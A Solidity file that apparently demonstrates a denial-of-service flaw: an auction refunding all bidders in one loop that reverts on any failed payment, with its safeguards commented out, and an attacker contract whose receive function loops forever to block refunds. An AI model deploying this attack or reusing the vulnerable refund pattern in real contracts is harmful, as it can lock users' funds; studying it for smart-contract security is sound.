// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DosAuction {
  mapping(address => uint) public bidders;
  address[] public allBidders;
  uint public refundProgress;

  function bid() external payable {
    // require(msg.sender.code.length == 0, "no contracts");
    bidders[msg.sender] += msg.value;
    allBidders.push(msg.sender);
  }

  function refund() external {
    for(uint i = refundProgress; i < allBidders.length; i++) {
      address bidder = allBidders[i];

      (bool succes,) = bidder.call{value: bidders[bidder]}("");
      require(succes, "failed!");

      // if (!success) {
      //   failedRefunds.push(bidder)
      // }

      refundProgress++;
    }
  }
}

contract DosAttack {
  DosAuction auction;
  bool hack = true;
  address payable owner;

  constructor(address _auction) {
    auction = DosAuction(_auction);
    owner = payable(msg.sender);
  }

  function doBid() external payable {
    auction.bid{value: msg.value}();
  }

  function toggleHack() external {
    require(msg.sender == owner, "Failed");
    hack = !hack;
  }

  receive() external payable {
    if (hack == true) {
      while(true) {}
    } else {
      owner.transfer(msg.value);
    }
  }
}